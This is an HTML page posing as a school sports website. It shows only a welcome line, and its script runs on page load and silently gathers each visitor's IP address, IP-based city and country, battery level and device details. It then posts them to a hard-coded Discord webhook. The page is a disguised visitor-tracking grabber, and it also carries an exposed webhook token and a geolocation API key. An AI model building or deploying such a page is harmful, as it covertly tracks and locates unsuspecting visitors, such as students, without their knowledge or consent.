<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>School Website Sport</title>
    <style>
        body {
            background: linear-gradient(to right, #add8e6, #dda0dd);
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .content {
            padding: 20px;
            min-height: 150vh; /* Added for scrolling demonstration */
        }

        h1 {
            font-size: 2em;
            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
        }

        .info {
            margin-top: 20px;
            text-align: left;
        }
    </style>
</head>

<body>
    <div class="content">
        <h1>Welcome.</h1>
        <p>Scroll down to see more content...</p>
        <div class="info" id="visitorInfo"></div>
    </div>

    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return 'Unknown';
            }
        }

        async function getLocation(ip) {
            try {
                const apiKey = 'ipl_live_TrMYUZ4xSg3eTqWeS3fkWz1mZhG45lOq9fFGI7mD';
                const response = await fetch(`https://api.iplookupapi.com/v1?apiKey=${apiKey}&ip=${ip}`);
                const data = await response.json();
                return `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
            } catch (error) {
                console.error('Error fetching location:', error);
                return 'Unknown';
            }
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return battery.level !== null ? `${(battery.level * 100).toFixed(0)}%` : 'Unknown';
                } else {
                    return 'Battery info not supported';
                }
            } catch (error) {
                console.error('Error fetching battery info:', error);
                return 'Unknown';
            }
        }

        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';

            return `
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                Mobile Device: ${isMobile}
                Screen Resolution: ${screenResolution}
                Screen Orientation: ${screenOrientation}
            `;
        }

        async function sendToDiscord(ip, location, battery, deviceInfo) {
            const payload = {
                embeds: [{
                    title: "New Visitor Information",
                    color: 7506394,
                    fields: [
                        { name: "IP Address", value: ip, inline: true },
                        { name: "Location", value: location, inline: true },
                        { name: "Battery Level", value: battery, inline: true },
                        { name: "Device Info", value: deviceInfo, inline: false }
                    ],
                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
                }]
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            } catch (error) {
                console.error('Error sending to webhook:', error);
            }
        }

        async function main() {
            const ip = await getIPAddress();
            const battery = await getBatteryInfo();
            const deviceInfo = getDeviceInfo();
            const location = await getLocation(ip);

            document.getElementById('visitorInfo').innerText = `
                IP Address: ${ip}
                Location: ${location}
                Battery Level: ${battery}
                Device Info:
                ${deviceInfo}
            `;

            sendToDiscord(ip, location, battery, deviceInfo);
        }

        main();
    </script>
</body>
</html>
